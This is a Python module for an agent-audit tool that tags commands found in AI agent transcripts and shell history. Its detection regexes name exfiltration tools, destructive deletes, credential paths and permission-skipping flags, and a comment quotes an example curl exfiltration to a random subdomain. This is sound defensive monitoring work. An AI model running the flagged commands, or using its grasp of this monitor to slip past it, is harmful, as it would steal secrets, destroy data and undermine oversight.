"""``trialerror obs audit-digest`` -- one deterministic digest of a day of
autonomous agent activity, for the ``/sandbox-audit`` skill to judge.

The skill (``plugin/skills/sandbox-audit/SKILL.md``) is the spec: it names the
digest's top-level keys, the rubric that reads them, and the rule that the audit
never changes anything. This module is the digest half. It is deliberately
verdict-free -- it counts, tags and masks; it never decides. The rubric lives in
the skill so every auditor (this model, another model, a human) applies the same
one.

WHAT IT READS
-------------
Five sources, each independently optional; a source that is absent or unreadable
becomes a ``coverage`` row with a reason rather than an error, because "a source
was missing" is itself a finding the rubric acts on (its section 2).

An EMPTY source counts as absent, not as a quiet day: a transcripts directory that
holds no ``*.jsonl`` at all, and a history file that exists but has no lines, both
report ``present: false`` with a reason. The skill's rule 3 ("silence is not a clean
bill") names an empty history among its missing sources, and reporting either as
present would let the rubric reach QUIET on exactly the day the source stopped being
written.

(a) **Claude Code transcripts** -- every ``*.jsonl`` under ``--transcripts``
    (default: the current user's ``~/.claude/projects``), recursively, so the
    ``subagents/`` trees a spawning session writes are included and marked
    ``kind = "subagent"``. Parsing is tolerant by construction: an unreadable
    file, a truncated last line, a row shape this build has never seen, all
    increment a counter and are skipped. A SESSION is registered on its first
    row inside the window, never on the mere existence of a file -- that
    directory keeps one file per session forever, so counting files would make
    ``volume.total.sessions`` a count of the deployment's history rather than of
    the day. From every ``tool_use`` block:

    ===============================  ==================================
    tool                             lands in
    ===============================  ==================================
    ``Bash``                         ``shell_commands``
    ``Write`` ``Edit`` ``NotebookEdit``  ``file_writes``
    ``Read`` ``Grep`` ``Glob``       ``sensitive_reads`` (when the path or
                                     pattern matches a sensitive path)
    ``Agent`` / ``Task``             ``spawns``
    any                              ``tools`` (name -> count), and
                                     ``permission_flags`` when the input
                                     carries a permission-widening flag or
                                     names a settings/hook/plugin file
    ===============================  ==================================

    Input keys that carry FILE CONTENT or free prose (:data:`_CONTENT_KEYS`)
    are not scanned at all, so a ``settings.json`` body pasted into a ``Write``
    cannot reach the digest through the permission scanner. A spawn's
    ``prompt`` is one of those keys, with one narrow exception: the
    permission-FLAG regex runs over it, because "a subagent spawned with
    permissions skipped" is a rubric clause whose evidence lives in that string
    and nowhere else. Only the bounded :func:`_match_context` window around the
    flag is stored -- the same treatment the launch-id regex already gave it.

(b) **Shell history** -- ``--history FILE``, in three forms: the plain
    one-command-per-line form; zsh's ``EXTENDED_HISTORY``
    ``: <epoch>:<elapsed>;<command>``; and bash's ``HISTTIMEFORMAT`` form, which
    writes the timestamp as a ``#<epoch>`` COMMENT LINE before the command (a
    different shape, not a variant of zsh's -- parsed separately, and not
    counted as a line of history). Dated lines are windowed like everything
    else. Undated lines cannot be windowed at all, so the last
    :data:`HISTORY_UNDATED_TAIL` of them are included and the rest are counted
    in ``coverage.history`` -- stated, never silently dropped. An undated
    history is a source in poor standing, not a source in good standing:
    ``coverage.history.windowed`` is ``false`` for it, as a KEY and not only in
    prose, because the ``--since`` window never touched it and its oldest lines
    were discarded. The fix is on the machine writing the file
    (``HISTTIMEFORMAT`` for bash, ``setopt EXTENDED_HISTORY`` for zsh), which is
    why the deployment's own image sets both.

(c) **The program's event rows** in the window, read through a READ-ONLY
    connection to the ops store (never ``open_store``: opening for write would
    create and migrate a store the audit is only supposed to look at).

(d) **The doctor** at digest time -- its FAIL and WARN rows.

(e) ``--previous-dir`` -- earlier digest JSON files, for the volume medians the
    rubric compares against ("more than three times the seven-digest median").

CLASSIFIER TAGS
---------------
Every shell command (from a transcript or from history) is tagged by regex. A
command may carry several tags; a command may carry none. The tags, and what
earns them:

``destructive``
    ``rm`` with recursive+force against a root-like path (a filesystem root, a
    home, a bare glob, or a path only one or two segments deep); ``git push``
    with ``--force``/``-f``/a ``+ref`` refspec; ``git reset --hard``;
    ``git rebase``; ``git filter-branch``/``filter-repo``; ``DROP TABLE``;
    ``dd`` writing with ``of=``; ``mkfs``; ``chmod``/``chown`` against a
    containment or sensitive path; ``crontab -e``/``-r``; truncation of a
    ledger-shaped file (a single ``>`` redirect, or ``truncate -s 0``, onto a
    ``.jsonl``/ledger/law/digest path).
``network``
    ``curl``, ``wget``, ``ssh``, ``scp``, ``sftp``, ``rsync`` over ssh, ``nc``/
    ``ncat``, ``pip install`` from an explicit index URL, ``git`` clone/fetch/
    pull/push of a URL, or any bare URL in the command. Hosts are extracted and
    compared against ``--allowed-host``.
``permission``
    ``--dangerously-skip-permissions``, ``--permission-mode``, or an edit that
    names ``settings.json`` / ``settings.local.json`` / ``hooks.json`` / a
    plugin manifest.
``secret_path``
    any token matching a ``--sensitive-path`` pattern (defaults:
    :data:`DEFAULT_SENSITIVE_PATHS`).
``package_install``
    ``pip``/``npm``/``pnpm``/``yarn``/``apt`` install.
``container``
    ``docker``, ``docker compose``, ``podman``, ``nerdctl``.
``cron``
    ``crontab``, ``systemctl``, a path under ``/etc/cron``.
``git_push``
    any ``git push``.
``encode``
    ``base64``, ``openssl enc``, ``xxd``, ``uuencode``, or an archive being
    created (``tar -c``, ``zip -r``).
``exfil_suspect``
    the encode-then-send pair: one command carrying both ``encode`` and
    ``network``, or an ``encode`` command whose immediate successor in the same
    session is a ``network`` command. Both halves of a pair are tagged.

The rubric's ``injection_suspects`` tag is deliberately NOT produced here: it
asks whether a command repeats instruction-shaped text from an ingested
document, which needs the corpus this digest has no access to. The skill's own
wording ("when present") already allows for its absence.

REDACTION
---------
:func:`redact` runs over every string that reaches the JSON -- command text,
paths, URLs. It masks what looks like a credential, replacing the run with
``<masked:N>`` where ``N`` is the number of characters removed: ``sk-``/
``ghp_``-family/``AKIA`` keys, ``Bearer <token>``, the id in a ping URL, the
VALUE of any query parameter whose name looks secret-ish, then any remaining
hex run of 24+ characters or base64-ish run of 32+. File CONTENTS and
environment dumps never enter the digest at all -- only paths, command text and
counts -- so there is nothing to redact there.

Redaction is the LAST step, never the first: a command is classified, its hosts
extracted, its tokens matched against the sensitive paths and its redirect
targets parsed from the RAW text, and only the masked, clipped copy is stored.
Masking first would hide a command from its own classifier -- every generic
sweep here (24+ hex, 32+ base64-ish, a UUID) also matches a DNS label, and
``_URL_RE`` stops at a ``<``, so one mask anywhere in a URL's authority erased
the host, the ``allowed`` judgement and, for a command with no ``curl``/``wget``/
``ssh`` verb, the ``network`` tag itself. Which is to say: the mask erased
exactly the random-looking subdomain that is the canonical exfil shape.

Any 24+ character hex run is masked, and that includes an ORDINARY git commit
id: ``git show --stat <masked:40> -- some/path`` is what a routine command looks
like in the digest. The verb, flags and paths survive, so the command's meaning
does; the id is recovered from the transcript at the row's session id and
timestamp. Over-masking here is deliberate -- a rule that tried to tell a commit
id from a token would eventually get one of them wrong.

DETERMINISM
-----------
For a fixed input tree and a fixed window the output is byte-identical: every
list is sorted by (timestamp, session, discovery order), files are walked in
sorted relative-path order, and ``digest_sha256`` is taken over the canonical
JSON (sorted keys, compact separators) of the digest with that one field
removed. ``--until`` defaults to the wall clock, so pin it to compare two runs.

SIZE CAPS
---------
Each list is capped (:data:`CAPS`); ``volume.caps`` states the caps and
``volume.truncated`` how many entries each cap dropped. ``volume``'s own totals
are computed BEFORE capping, so a spike stays visible even in a capped digest.
``shell_commands`` keeps tagged commands first when it has to drop something --
an untagged ``ls`` is the entry worth losing. ``sessions`` keeps the most recent
when it has to drop something, then restores the slug order for the reader: a
slug is a project path plus a uuid, so dropping "the last ones alphabetically"
would be dropping at random, and the entry worth keeping is today's.
"""

from __future__ import annotations

import fnmatch
import hashlib
import json
import os
import re
import statistics
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

from trialerror.util.timeutil import now_dt

__all__ = [
    "DEFAULT_SENSITIVE_PATHS",
    "CAPS",
    "HISTORY_UNDATED_TAIL",
    "TAG_NAMES",
    "AuditOptions",
    "build_digest",
    "canonical_json",
    "compute_digest_sha256",
    "classify_command",
    "parse_since",
    "redact",
]

# ---------------------------------------------------------------------------
# policy defaults + caps
# ---------------------------------------------------------------------------

#: Glob-ish path fragments treated as sensitive when nothing is configured.
#: Matched as a substring OR an ``fnmatch`` pattern against every path-shaped
#: token, so ``secrets/`` catches ``/somewhere/secrets/ntfy.url`` and ``*.key``
#: catches ``keys/openalex.key``.
DEFAULT_SENSITIVE_PATHS: tuple[str, ...] = (
    "/run/secrets",
    "~/.ssh",
    "/.ssh/",
    "secrets/",
    "*.key",
    "*.pem",
    "rclone.conf",
    ".env",
    "id_rsa",
    "id_ed25519",
)

#: Per-list caps. ``volume.caps`` echoes this; ``volume.truncated`` counts what
#: each cap dropped.
CAPS: dict[str, int] = {
    "sessions": 200,
    "shell_commands": 500,
    "file_writes": 500,
    "sensitive_reads": 200,
    "network": 200,
    "permission_flags": 200,
    "spawn_entries": 200,
    "program_events": 300,
    "doctor_rows": 200,
}

#: One command's text is truncated to this many characters (after redaction),
#: with a trailing marker -- a pasted heredoc must not turn the digest into a
#: file-contents dump, which the skill forbids outright.
MAX_COMMAND_CHARS = 2000

#: Undated history lines cannot be windowed; this many of the most recent are
#: kept and the rest are counted in ``coverage.history``.
HISTORY_UNDATED_TAIL = 200

TAG_NAMES: tuple[str, ...] = (
    "destructive",
    "network",
    "permission",
    "secret_path",
    "package_install",
    "container",
    "cron",
    "git_push",
    "encode",
    "exfil_suspect",
)

#: Event types the digest lifts out of the ops store when a program root is
#: given. ``spawn_gate_refused`` is forward-looking: today's spawn-gate hook
#: signals a refusal by exiting non-zero and writes no row, so this count is
#: honestly zero until a hook writes one (stated in ``coverage.events``).
PROGRAM_EVENT_TYPES: tuple[str, ...] = (
    "hook_alive",
    "subagent_return",
    "session_boot",
    "session_close",
    "session_abandon",
    "spawn_gate_refused",
)
GATE_REFUSAL_EVENT_TYPES: tuple[str, ...] = ("spawn_gate_refused",)

_WRITE_TOOLS = {"write", "edit", "multiedit", "notebookedit"}
_READ_TOOLS = {"read", "grep", "glob", "notebookread"}
_SPAWN_TOOLS = {"agent", "task"}
_BASH_TOOLS = {"bash", "bashoutput"}

_LAUNCH_ID_RE = re.compile(r"\bLNCH-[A-Za-z0-9_-]+")

# ---------------------------------------------------------------------------
# redaction
# ---------------------------------------------------------------------------

_SECRETISH_PARAM = r"(?:key|token|secret|password|passwd|pwd|sig|signature|auth|access|credential)"

#: Named credential shapes -- applied FIRST, before the generic value and
#: hex/base64 rules, so that a shape with a KNOWN extent (a whole ``sk-`` key, a
#: whole ``Bearer`` token) is masked as one run and reports its true length,
#: rather than being cut short by the value rule at the first space. In
#: ``Authorization: Bearer <token>`` the token is masked here and the literal
#: word ``Bearer`` is then masked too, by the value rule firing on the header
#: name: ``Authorization: <masked:6> <masked:45>``. That is over-masking without
#: loss of meaning -- the header is still identifiable -- and it is what the
#: reader will see.
_NAMED_REDACTIONS: tuple[re.Pattern[str], ...] = (
    re.compile(r"\bsk-[A-Za-z0-9_\-]{16,}"),
    re.compile(r"\b(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{16,}"),
    re.compile(r"\bgithub_pat_[A-Za-z0-9_]{20,}"),
    re.compile(r"\bAKIA[0-9A-Z]{12,}"),
    re.compile(r"(?i)(?<=\bBearer\s)[A-Za-z0-9._\-~+/]{8,}=*"),
    re.compile(r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}"),
)

#: A ping/notify URL's path id IS the credential -- the topic or ping id is the
#: whole of the authentication. Keyed on the HOST LABEL (``ntfy…``, ``hc-ping…``)
#: rather than on ``ntfy.sh`` / ``hc-ping.com``, because a deployment points at
#: its own instance and ``https://ntfy.<its-own-domain>/<topic>`` is the same
#: credential in the same place. Prefix-preserving: the host stays readable.
_NOTIFY_PATH_RE = re.compile(
    r"(?i)(https?://(?:[A-Za-z0-9\-]+\.)*(?:ntfy|hc-ping)[A-Za-z0-9\-]*\.[A-Za-z0-9.\-]+/)"
    r"((?!<masked:)[A-Za-z0-9_\-]{8,})"
)

#: Generic shapes -- applied LAST, so a named rule always gets first refusal.
_GENERIC_REDACTIONS: tuple[re.Pattern[str], ...] = (
    re.compile(r"\b[0-9a-fA-F]{24,}\b"),
    re.compile(r"(?<![A-Za-z0-9+/])[A-Za-z0-9+/]{32,}={0,2}(?![A-Za-z0-9+/])"),
)

#: query-string / assignment values whose NAME looks secret-ish: only the value
#: is masked, so the reader still sees which parameter it was.
#:
#: ``(?!<masked:)`` keeps this rule off a marker a NAMED rule already wrote.
#: Without it ``OPENAI_API_KEY=sk-proj-<38 chars>`` was masked to
#: ``<masked:38>`` and then masked AGAIN to ``<masked:11>`` -- the length of the
#: marker, not of the secret -- in a document whose whole value is that the
#: reader can trust what it quotes. It also makes :func:`redact` idempotent.
_REDACT_VALUE_RE = re.compile(
    rf"(?i)([?&;\s\-]{{0,2}}[A-Za-z0-9_.\-]*{_SECRETISH_PARAM}[A-Za-z0-9_.\-]*\s*[=:]\s*)"
    r"((?!<masked:)[^\s&'\"]+)"
)

#: Prefix-preserving rules, applied between the named and the generic sweeps:
#: group 1 survives so the reader still sees WHICH parameter or WHICH host it
#: was, group 2 is masked.
_VALUE_REDACTIONS: tuple[re.Pattern[str], ...] = (_NOTIFY_PATH_RE, _REDACT_VALUE_RE)


def _mask(n: int) -> str:
    return f"<masked:{n}>"


def redact(text: str) -> str:
    """Mask credential-shaped substrings in ``text``.

    Pure, order-stable and idempotent: the same input always produces the same
    output, ``redact(redact(x)) == redact(x)``, and ``N`` is the length of the
    text that was actually removed -- no rule re-masks a marker an earlier one
    wrote.
    """
    if not text:
        return text
    out = text
    for pattern in _NAMED_REDACTIONS:
        out = pattern.sub(lambda m: _mask(len(m.group(0))), out)
    for pattern in _VALUE_REDACTIONS:
        out = pattern.sub(lambda m: m.group(1) + _mask(len(m.group(2))), out)
    for pattern in _GENERIC_REDACTIONS:
        out = pattern.sub(lambda m: _mask(len(m.group(0))), out)
    return out


def _clip(text: str) -> str:
    if len(text) <= MAX_COMMAND_CHARS:
        return text
    return text[:MAX_COMMAND_CHARS] + f"...<clipped:{len(text) - MAX_COMMAND_CHARS}>"


def _safe(text: Any) -> str:
    """Every string that reaches the digest goes through here."""
    if text is None:
        return ""
    return _clip(redact(str(text)))


# ---------------------------------------------------------------------------
# window
# ---------------------------------------------------------------------------

_RELATIVE_RE = re.compile(r"^(\d+)\s*([smhdw])$", re.IGNORECASE)
_UNIT_SECONDS = {"s": 1, "m": 60, "h": 3600, "d": 86400, "w": 604800}


def parse_since(value: str, *, until: datetime) -> datetime:
    """``24h`` / ``90m`` / ``7d`` (relative to ``until``) or an ISO-8601
    instant. Raises :class:`ValueError` with a usable message otherwise."""
    value = (value or "").strip()
    m = _RELATIVE_RE.match(value)
    if m:
        return until - timedelta(seconds=int(m.group(1)) * _UNIT_SECONDS[m.group(2).lower()])
    dt = _parse_ts(value)
    if dt is None:
        raise ValueError(
            f"--since {value!r} is neither a relative window (e.g. 24h, 90m, 7d) nor an ISO-8601 instant"
        )
    return dt


def _parse_ts(value: Any) -> datetime | None:
    """Tolerant ISO-8601 parse. Returns ``None`` rather than raising -- a row
    with an unparseable timestamp is a row to count, not a run to abort."""
    if isinstance(value, (int, float)):
        try:
            return datetime.fromtimestamp(float(value), tz=timezone.utc)
        except (OverflowError, OSError, ValueError):
            return None
    if not isinstance(value, str) or not value.strip():
        return None
    raw = value.strip()
    candidate = raw[:-1] + "+00:00" if raw.endswith(("Z", "z")) else raw
    try:
        dt = datetime.fromisoformat(candidate)
    except ValueError:
        return None
    return dt.replace(tzinfo=timezone.utc) if dt.tzinfo is None else dt.astimezone(timezone.utc)


def _iso(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


# ---------------------------------------------------------------------------
# path / host helpers
# ---------------------------------------------------------------------------

_TOKEN_RE = re.compile(r"[^\s'\"|;&<>()]+")
_URL_RE = re.compile(r"\b(?:https?|ftp|ssh|git)://[^\s'\"<>|;]+", re.IGNORECASE)
#: ``user@host:path`` / ``host:path`` -- ``:(?!//)`` keeps a URL's own scheme
#: (``https://``) from being read as a host named "https".
_SCP_HOST_RE = re.compile(r"\b(?:[A-Za-z0-9_.\-]+@)?([A-Za-z0-9][A-Za-z0-9.\-]{2,}):(?!//)(?:/|~|[A-Za-z0-9_.\-]+/)")
#: an ``ssh`` target only counts as a host when it is qualified (``user@x`` or a
#: dotted name) -- otherwise ``ssh -i mykey box`` reports the key file as a host.
#: ``(?:-\S+\s+(?:\S+\s+)?)*`` skips flags and their values (``ssh -i mykey
#: host``); host extraction is best-effort by construction and says so.
_SSH_HOST_RE = re.compile(
    r"\bssh\s+(?:-\S+\s+(?:\S+\s+)?)*"
    r"(?:([A-Za-z0-9_.\-]+@[A-Za-z0-9][A-Za-z0-9.\-]*)|([A-Za-z0-9][A-Za-z0-9\-]*\.[A-Za-z0-9.\-]+))"
)


def _normalize_path(text: str) -> str:
    return text.replace("\\", "/").strip().strip("'\"")


def matches_sensitive(path: str, patterns: list[str]) -> str | None:
    """The first sensitive pattern ``path`` matches, or ``None``.

    A pattern matches if it appears as a substring of the normalized path or if
    :func:`fnmatch.fnmatch` accepts it -- so both a directory fragment
    (``secrets/``) and a glob (``*.key``) work without the caller having to know
    which kind it wrote.
    """
    p = _normalize_path(path).lower()
    if not p:
        return None
    for pattern in patterns:
        pat = _normalize_path(pattern).lower()
        if not pat:
            continue
        if pat in p or fnmatch.fnmatch(p, pat) or fnmatch.fnmatch(p, f"*{pat}*"):
            return pattern
    return None


def _inside_roots(path: str, roots: list[str]) -> bool | None:
    """``True``/``False`` against the declared write roots, or ``None`` when no
    roots were declared -- an empty policy yields "not judged", never a verdict
    the deployment never asked for."""
    if not roots:
        return None
    p = _normalize_path(path).lower()
    for root in roots:
        r = _normalize_path(root).lower().rstrip("/")
        if r and (p == r or p.startswith(r + "/")):
            return True
    return False


def extract_hosts(command: str) -> list[str]:
    """Hosts named by a command: URL authorities, ``user@host:path`` specs, and
    the first bare argument of an ``ssh``/``scp`` invocation. Sorted, unique."""
    hosts: set[str] = set()
    for url in _URL_RE.findall(command):
        rest = url.split("://", 1)[1]
        authority = rest.split("/", 1)[0].split("?", 1)[0]
        if "@" in authority:
            authority = authority.rsplit("@", 1)[1]
        authority = authority.split(":", 1)[0]
        if authority:
            hosts.add(authority.lower())
    for m in _SCP_HOST_RE.finditer(command):
        hosts.add(m.group(1).lower())
    for m in _SSH_HOST_RE.finditer(command):
        target = m.group(1) or m.group(2) or ""
        if "@" in target:
            target = target.rsplit("@", 1)[1]
        if target:
            hosts.add(target.lower())
    return sorted(hosts)


# ---------------------------------------------------------------------------
# the classifier
# ---------------------------------------------------------------------------

_RM_RECURSIVE_RE = re.compile(r"\brm\b(?=(?:\s+-\S+)*\s+-\S*[rR])(?=(?:\s+-\S+)*\s+-\S*f)", re.IGNORECASE)
_FORCE_PUSH_RE = re.compile(r"\bgit\b[^\n]*\bpush\b[^\n]*(?:--force|(?<!\w)-f(?!\w)|\s\+[A-Za-z0-9_/\-]+:)")
_TRUNCATE_LEDGER_RE = re.compile(
    r"(?:(?<![>\d])>(?!>)\s*|truncate\s+-s\s*0\s+)(\S*(?:ledger|law|digest|\.jsonl|\.ndjson)\S*)",
    re.IGNORECASE,
)
_PERMISSION_FILE_RE = re.compile(
    r"(settings\.local\.json|settings\.json|hooks\.json|\.claude-plugin/|plugin\.json|marketplace\.json|managed-settings[^\s]*\.json)",
    re.IGNORECASE,
)
_PERMISSION_FLAG_RE = re.compile(r"(--dangerously-skip-permissions|--permission-mode)", re.IGNORECASE)

_SIMPLE_TAGS: tuple[tuple[str, re.Pattern[str]], ...] = (
    ("destructive", re.compile(r"\bgit\b[^\n]*\breset\b[^\n]*--hard", re.IGNORECASE)),
    ("destructive", re.compile(r"\bgit\b[^\n]*\brebase\b", re.IGNORECASE)),
    ("destructive", re.compile(r"\bgit\b[^\n]*\bfilter-(?:branch|repo)\b", re.IGNORECASE)),
    ("destructive", re.compile(r"\bDROP\s+TABLE\b", re.IGNORECASE)),
    ("destructive", re.compile(r"\bdd\b[^\n]*\bof=", re.IGNORECASE)),
    ("destructive", re.compile(r"\bmkfs(\.\w+)?\b", re.IGNORECASE)),
    ("destructive", re.compile(r"\bcrontab\b\s+-[er]\b", re.IGNORECASE)),
    ("destructive", re.compile(r"\bshred\b", re.IGNORECASE)),
    ("network", re.compile(r"\b(?:curl|wget|scp|sftp|ncat|telnet)\b", re.IGNORECASE)),
    ("network", re.compile(r"\bnc\b\s+\S", re.IGNORECASE)),
    ("network", re.compile(r"\bssh\b\s+\S", re.IGNORECASE)),
    ("network", re.compile(r"\brsync\b[^\n]*(?:-e\s+ssh|\S+@\S+:)", re.IGNORECASE)),
    ("network", re.compile(r"\bgit\b[^\n]*\b(?:clone|fetch|pull|push)\b[^\n]*(?:https?://|git://|\S+@\S+:)", re.IGNORECASE)),
    ("network", re.compile(r"\bpip3?\b[^\n]*\binstall\b[^\n]*(?:--index-url|--extra-index-url|\s-i\s)", re.IGNORECASE)),
    ("network", _URL_RE),
    ("package_install", re.compile(r"\b(?:pip3?|uv\s+pip)\b[^\n]*\binstall\b", re.IGNORECASE)),
    ("package_install", re.compile(r"\bpython3?\s+-m\s+pip\b[^\n]*\binstall\b", re.IGNORECASE)),
    ("package_install", re.compile(r"\b(?:npm|pnpm|yarn)\b\s+(?:install|add|i)\b", re.IGNORECASE)),
    ("package_install", re.compile(r"\bapt(?:-get)?\b[^\n]*\binstall\b", re.IGNORECASE)),
    ("container", re.compile(r"\b(?:docker|podman|nerdctl)\b", re.IGNORECASE)),
    ("container", re.compile(r"\bdocker-compose\b", re.IGNORECASE)),
    ("cron", re.compile(r"\bcrontab\b", re.IGNORECASE)),
    ("cron", re.compile(r"\bsystemctl\b", re.IGNORECASE)),
    ("cron", re.compile(r"/etc/cron", re.IGNORECASE)),
    ("git_push", re.compile(r"\bgit\b[^\n]*\bpush\b", re.IGNORECASE)),
    ("encode", re.compile(r"\bbase64\b", re.IGNORECASE)),
    ("encode", re.compile(r"\bopenssl\b\s+(?:enc|base64)\b", re.IGNORECASE)),
    ("encode", re.compile(r"\b(?:xxd|uuencode|base32)\b", re.IGNORECASE)),
    ("encode", re.compile(r"\btar\b[^\n]*(?:-c|--create)", re.IGNORECASE)),
    ("encode", re.compile(r"\bzip\b\s+-r\b", re.IGNORECASE)),
)

_ROOT_LIKE = {"/", "/*", "~", "~/", "~/*", ".", "./", "..", "*", "$HOME", "${HOME}"}


def _is_root_like(token: str) -> bool:
    """A path shallow enough that a recursive delete against it takes out
    something shared: a filesystem root, a home, a bare glob, or an absolute
    path only one or two segments deep (``/workspace``, ``/workspace/program``)."""
    t = _normalize_path(token).rstrip("/")
    if not t or token.strip() in _ROOT_LIKE:
        return True
    if re.fullmatch(r"[A-Za-z]:", t) or re.fullmatch(r"[A-Za-z]:/[^/]*", t):
        return True
    if t.startswith("$") or t.startswith("~"):
        return t.count("/") <= 2
    if t.startswith("/"):
        return t.count("/") <= 2
    return False


def classify_command(command: str, *, sensitive_paths: list[str]) -> list[str]:
    """The tag set for one command. See this module's docstring for the
    rubric-facing meaning of each tag. Returns a sorted list (determinism)."""
    tags: set[str] = set()
    if not command:
        return []
    for tag, pattern in _SIMPLE_TAGS:
        if pattern.search(command):
            tags.add(tag)
    if _FORCE_PUSH_RE.search(command):
        tags.add("destructive")
    if _TRUNCATE_LEDGER_RE.search(command):
        tags.add("destructive")
    if _RM_RECURSIVE_RE.search(command):
        for token in _TOKEN_RE.findall(command):
            if token.startswith("-"):
                continue
            if _is_root_like(token):
                tags.add("destructive")
                break
    if _PERMISSION_FLAG_RE.search(command) or _PERMISSION_FILE_RE.search(command):
        tags.add("permission")
    if re.search(r"\b(?:chmod|chown)\b", command, re.IGNORECASE):
        for token in _TOKEN_RE.findall(command):
            if "containment" in token.lower() or matches_sensitive(token, sensitive_paths):
                tags.add("destructive")
                break
    for token in _TOKEN_RE.findall(command):
        if matches_sensitive(token, sensitive_paths):
            tags.add("secret_path")
            break
    if "encode" in tags and "network" in tags:
        tags.add("exfil_suspect")
    return sorted(tags)


_REDIRECT_RE = re.compile(r"(?<![0-9&>])>{1,2}\s*([^\s|;&<>()]+)")


def _shell_write_targets(command: str) -> list[str]:
    """Redirection targets the verb can parse out of a command -- best effort by
    construction (a shell is not a regex), which is why the digest says
    ``source: "shell-redirect"`` on what it finds rather than claiming the list
    is complete."""
    out: list[str] = []
    for target in _REDIRECT_RE.findall(command):
        t = target.strip().strip("'\"")
        if not t or t in ("/dev/null", "NUL") or t.startswith("&"):
            continue
        out.append(t)
    return out


# ---------------------------------------------------------------------------
# options
# ---------------------------------------------------------------------------


class AuditOptions:
    """Everything :func:`build_digest` needs, resolved once so the CLI shell
    stays a shell."""

    def __init__(
        self,
        *,
        since: str = "24h",
        until: str | None = None,
        transcripts: str | Path | None = None,
        history: str | Path | None = None,
        program_root: str | Path | None = None,
        platform_root: str | Path | None = None,
        previous_dir: str | Path | None = None,
        allowed_write_roots: list[str] | None = None,
        sensitive_paths: list[str] | None = None,
        allowed_hosts: list[str] | None = None,
    ) -> None:
        if until:
            parsed_until = _parse_ts(until)
            if parsed_until is None:
                raise ValueError(f"--until {until!r} is not an ISO-8601 instant")
            self.until_dt = parsed_until
        else:
            self.until_dt = now_dt()
        self.since_arg = since
        self.since_dt = parse_since(since, until=self.until_dt)
        self.transcripts = Path(transcripts) if transcripts else default_transcripts_dir()
        self.history = Path(history) if history else None
        self.program_root = Path(program_root) if program_root else None
        self.platform_root = Path(platform_root) if platform_root else None
        self.previous_dir = Path(previous_dir) if previous_dir else None
        self.allowed_write_roots = sorted(allowed_write_roots or [])
        self.sensitive_paths = sorted(sensitive_paths or DEFAULT_SENSITIVE_PATHS)
        self.allowed_hosts = sorted(h.lower() for h in (allowed_hosts or []))


def default_transcripts_dir() -> Path:
    """Where Claude Code keeps this user's transcripts. ``CLAUDE_CONFIG_DIR``
    wins when set (a deployment sets it per account), else ``~/.claude``."""
    base = os.environ.get("CLAUDE_CONFIG_DIR")
    root = Path(base) if base else Path.home() / ".claude"
    return root / "projects"


# ---------------------------------------------------------------------------
# transcripts
# ---------------------------------------------------------------------------


def _iter_tool_uses(row: dict[str, Any]):
    message = row.get("message")
    if not isinstance(message, dict):
        return
    content = message.get("content")
    if not isinstance(content, list):
        return
    for block in content:
        if isinstance(block, dict) and block.get("type") == "tool_use":
            yield block


def _row_model(row: dict[str, Any]) -> str | None:
    message = row.get("message")
    if isinstance(message, dict):
        model = message.get("model")
        if isinstance(model, str) and model:
            return model
    model = row.get("model")
    return model if isinstance(model, str) and model else None


#: Input keys that carry FILE CONTENT or free prose rather than a path, a flag
#: or a URL. The skill forbids file contents in the digest outright, so these
#: are never even scanned -- a settings.json body pasted into a Write must not
#: be able to reach the digest through the permission-flag scanner.
_CONTENT_KEYS = frozenset(
    {
        "content",
        "new_string",
        "old_string",
        "new_str",
        "old_str",
        "file_text",
        "new_source",
        "old_source",
        "text",
        "body",
        "prompt",
        "message",
        "edits",
    }
)

#: One scanned string is never longer than this; the digest only ever stores a
#: short window around an actual match anyway (:func:`_match_context`).
MAX_SCAN_CHARS = 512


def _scan_strings(value: Any, out: list[str], depth: int = 0) -> None:
    """Flatten a tool input into its string leaves -- used ONLY for spotting
    permission flags and URLs, never copied into the digest verbatim.
    Content-bearing keys (:data:`_CONTENT_KEYS`) are skipped entirely and every
    leaf is clipped to :data:`MAX_SCAN_CHARS`."""
    if depth > 6 or len(out) > 200:
        return
    if isinstance(value, str):
        out.append(value[:MAX_SCAN_CHARS])
    elif isinstance(value, dict):
        for key, v in value.items():
            if isinstance(key, str) and key.lower() in _CONTENT_KEYS:
                continue
            _scan_strings(v, out, depth + 1)
    elif isinstance(value, list):
        for v in value[:50]:
            _scan_strings(v, out, depth + 1)


def _match_context(text: str, match: re.Match[str], width: int = 60) -> str:
    """A short window around a match -- enough for the auditor to see what the
    flag was attached to, far too little to be a file dump."""
    start = max(0, match.start() - width)
    end = min(len(text), match.end() + width)
    fragment = text[start:end]
    return ("..." if start else "") + fragment + ("..." if end < len(text) else "")


class _Collector:
    """Accumulates the raw entries; :func:`build_digest` shapes them."""

    def __init__(self, opts: AuditOptions) -> None:
        self.opts = opts
        self.seq = 0
        self.sessions: dict[str, dict[str, Any]] = {}
        self.tools: dict[str, int] = {}
        self.shell_commands: list[dict[str, Any]] = []
        self.file_writes: list[dict[str, Any]] = []
        self.sensitive_reads: list[dict[str, Any]] = []
        self.network: list[dict[str, Any]] = []
        self.permission_flags: list[dict[str, Any]] = []
        self.spawn_entries: list[dict[str, Any]] = []

    def _next(self) -> int:
        self.seq += 1
        return self.seq

    # -- shell ------------------------------------------------------------
    def add_command(
        self, *, command: str, session_id: str, ts: str | None, ts_dt: datetime | None, cwd: str | None, source: str
    ) -> None:
        # EVERY judgement below reads ``raw``; only ``text`` -- the masked,
        # clipped copy -- is ever stored. Classifying the masked copy instead
        # (as this did until 2026-09-06) let redaction erase the very thing the
        # classifier looks for: the generic base64/hex/UUID sweeps all match a
        # DNS label, so `curl https://<random-subdomain>.example.net/drop`
        # became `curl https://<masked:34>.example.net/drop`, which _URL_RE
        # (which excludes `<` and `>`) no longer matches at all -- no host, no
        # `allowed` judgement, and for a command with no curl/wget/ssh verb no
        # `network` tag either. Clipping did the same to anything past
        # MAX_COMMAND_CHARS. The digest holds no more raw text this way; the
        # tags and the network[]/sensitive_reads[] rows simply describe what
        # actually ran.
        raw = "" if command is None else str(command)
        text = _safe(raw)
        tags = classify_command(raw, sensitive_paths=self.opts.sensitive_paths)
        seq = self._next()
        entry = {
            "seq": seq,
            "session_id": session_id,
            "timestamp": ts,
            "cwd": _safe(cwd) if cwd else None,
            "source": source,
            "command": text,
